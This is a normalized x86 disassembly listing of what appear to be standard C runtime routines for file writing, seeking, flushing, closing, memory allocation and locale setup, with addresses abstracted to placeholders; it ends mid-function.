mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_40c61a
mov [ eax ] 0x1c
call sub_40c62d
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_40c640
pop ecx
jmp r-xdata
call sub_40c61a
mov [ eax ] 0x9
call sub_40c62d
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_412b0f
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_412965
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_412abd
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_412abd
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_412965
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_40ddea
push 0x10
push r--data
call sub_40be80
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_40c62d
and [ eax ] 0x0
call sub_40c61a
mov [ eax ] 0x9
call sub_40c62d
and [ eax ] 0x0
call sub_40c61a
mov [ eax ] 0x9
call sub_40c5c8
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_40bec5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_412c4a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40c61a
mov [ eax ] 0x9
call sub_40c62d
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_40d6ed
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40deb6
mov eax [ ebp - 0x1c ]
sub_40debe
push 0x10
push r--data
call sub_40be80
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_40c61a
mov [ eax ] 0x9
call sub_40c61a
mov [ eax ] 0x9
call sub_40c5c8
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_40bec5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_412c4a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_40c61a
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_412be1
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40df8f
mov eax [ ebp - 0x1c ]
call sub_40c62d
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_40df97
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_408a41
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_40dfc8
mov edi edi
push ebp
mov ebp esp
mov eax 0x1020
call sub_412b30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_40d47e
mov ebx eax
xor eax eax
pop ecx
mov [ ebp - 0x1018 ] ebx
cmp [ esi + 0x4 ] eax
jge r-xdata
push 0x1
push eax
push eax
push ebx
call sub_40e404
add esp 0x10
mov edi eax
mov [ ebp - 0x1014 ] edi
mov [ ebp - 0x1010 ] edx
test edx edx
jg r-xdata
mov [ esi + 0x4 ] eax
mov eax ebx
sar eax 0x5
lea eax [ eax * 4 + rw-data ]
and ebx 0x1f
mov [ ebp - 0x101c ] eax
mov eax [ eax ]
shl ebx 0x6
add eax ebx
mov cl [ eax + 0x24 ]
add cl cl
sar cl 0x1
test [ esi + 0xc ] 0x108
mov [ ebp - 0x1005 ] cl
jne r-xdata
jl r-xdata
mov ecx [ esi ]
mov edx [ esi + 0xc ]
mov edi ecx
sub edi [ esi + 0x8 ]
mov [ ebp - 0x100c ] edi
test dl 0x3
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ ebp - 0x1010 ]
cdq
sub edi eax
sbb ecx edx
mov eax edi
mov edx ecx
jmp r-xdata
or eax 0xffffffff
or edx eax
jmp r-xdata
test edi edi
jae r-xdata
test dl dl
js r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_407abb
leave
retn
mov edx [ ebp - 0x1014 ]
or edx [ ebp - 0x1010 ]
jne r-xdata
call sub_40c61a
mov [ eax ] 0x16
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
xor edx edx
cmp [ eax + 0x30 ] edx
je r-xdata
test [ esi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0x100c ]
jmp r-xdata
mov edx [ esi + 0x8 ]
jmp r-xdata
shr edi 0x1
mov [ ebp - 0x1020 ] edi
cmp [ esi + 0x4 ] edx
jne r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
mov edx [ esi + 0x4 ]
test edx edx
jne r-xdata
cmp edx ecx
jb r-xdata
push edx
push [ eax + 0x2c ]
push [ eax + 0x28 ]
push [ ebp - 0x1018 ]
call sub_40e404
mov esi eax
mov eax [ ebp - 0x101c ]
mov eax [ eax ]
add esp 0x10
mov edi edx
cmp esi [ eax + ebx + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x1014 ]
mov edx [ ebp - 0x1010 ]
jmp r-xdata
mov eax [ ebp - 0x100c ]
xor edx edx
add eax [ ebp - 0x1014 ]
adc edx [ ebp - 0x1010 ]
shr [ ebp - 0x100c ] 0x1
sub ecx [ esi + 0x8 ]
test [ eax + 0x4 ] 0x80
lea edi [ edx + ecx ]
je r-xdata
and [ ebp - 0x100c ] edx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
cmp edi [ eax + ebx + 0x2c ]
jne r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp - 0x1018 ]
call sub_40e404
add esp 0x10
cmp eax [ ebp - 0x1014 ]
jne r-xdata
inc edx
inc [ ebp - 0x100c ]
push 0x0
lea ecx [ ebp - 0x100c ]
push ecx
push 0x1000
lea ecx [ ebp - 0x1004 ]
push ecx
push [ eax + ebx ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
sub [ ebp - 0x1014 ] edi
sbb [ ebp - 0x1010 ] 0x0
shr edi 0x1
push 0x0
push [ ebp - 0x1010 ]
push [ ebp - 0x1014 ]
push [ ebp - 0x1018 ]
call sub_40e404
add esp 0x10
test edx edx
jg r-xdata
cmp edx [ ebp - 0x1010 ]
jne r-xdata
push 0x0
push [ ebp - 0x1010 ]
push [ ebp - 0x1014 ]
push [ ebp - 0x1018 ]
call sub_40e404
add esp 0x10
test edx edx
jg r-xdata
mov eax 0x200
cmp edi eax
ja r-xdata
jl r-xdata
mov eax [ esi + 0x8 ]
lea ecx [ eax + edi ]
jmp r-xdata
mov ecx [ ebp - 0x100c ]
mov ebx [ ebp - 0x1020 ]
cmp ebx ecx
ja r-xdata
jl r-xdata
mov edi [ esi + 0x18 ]
mov ecx [ esi + 0xc ]
test cl 0x8
je r-xdata
test eax eax
jb r-xdata
cmp eax ecx
jb r-xdata
lea eax [ ebp - 0x1004 ]
test ebx ebx
je r-xdata
test eax eax
jb r-xdata
inc edi
mov edi eax
test ecx 0x400
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ esi + 0xc ] 0x2000
jmp r-xdata
lea ecx [ ebp - 0x1004 ]
sub eax ecx
xor edx edx
add eax esi
adc edx edi
jmp r-xdata
lea edx [ ebp + ecx - 0x1004 ]
mov eax [ ebp - 0x101c ]
mov eax [ eax ]
test [ eax + ebx + 0x4 ] 0x4
inc eax
inc edi
je r-xdata
mov cl [ eax ]
cmp cl 0xd
jne r-xdata
movzx ecx cl
movsx ecx [ ecx + rw-data ]
add eax ecx
lea ecx [ edx - 0x1 ]
cmp eax ecx
jae r-xdata
dec ebx
cmp eax edx
jae r-xdata
inc eax
test ebx ebx
jne r-xdata
lea ecx [ eax + 0x1 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax ecx
jmp r-xdata
sub_40e312
push 0x10
push r--data
call sub_40be80
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_408e99
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_40dfc8
pop ecx
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e375
mov eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_40bec5
retn
sub_40e37f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_412be1
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_40c61a
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_40c640
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_40e404
push 0x14
push r--data
call sub_40be80
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_40c62d
and [ eax ] 0x0
call sub_40c61a
mov [ eax ] 0x9
call sub_40c62d
and [ eax ] 0x0
call sub_40c61a
mov [ eax ] 0x9
call sub_40c5c8
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_40bec5
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_412c4a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40c61a
mov [ eax ] 0x9
call sub_40c62d
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e37f
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e4e4
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_40e4ee
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_412be1
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_40c640
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_412be1
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_412be1
push 0x1
mov edi eax
call sub_412be1
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_412b5b
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_40e58a
push 0x10
push r--data
call sub_40be80
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_40c62d
and [ eax ] 0x0
call sub_40c61a
mov [ eax ] 0x9
call sub_40c62d
and [ eax ] 0x0
call sub_40c61a
mov [ eax ] 0x9
call sub_40c5c8
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_40bec5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_412c4a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40c61a
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_40e4ee
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e646
mov eax [ ebp - 0x1c ]
sub_40e67c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_40974b
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_412ad7
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_40e81b
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_40e734
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_407abb
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_406b90
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_40972b
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_40ac3c
pop ecx
cmp eax ebx
je r-xdata
call sub_40e650
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_40e81b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40974b
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_40e734
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40e85b
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_40c61a
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_40af5f
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_40e8dd
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_40ac3c
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_408a41
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_40af5f
pop ecx
call sub_40c61a
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_40c61a
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40c5d8
pop ecx
mov [ esi ] eax
push esi
call sub_40af5f
pop ecx
test eax eax
je r-xdata
call sub_40c61a
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40c5d8
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_40e98a
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
movzx ebx [ eax + 0x42 ]
push esi
mov esi ecx
movzx ecx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
test esi esi
jne r-xdata
and [ ebp - 0x8 ] 0x0
push edi
mov [ ebp - 0xc ] eax
lea eax [ esi + 0x4 ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
mov edi eax
lea eax [ esi + 0x8 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0xc ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x10 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ esi + 0x14 ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x18 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
push esi
push 0x37
push ebx
or edi eax
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x20 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ esi + 0x24 ]
push eax
push 0x2b
push ebx
push 0x1
lea eax [ ebp - 0xc ]
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x28 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
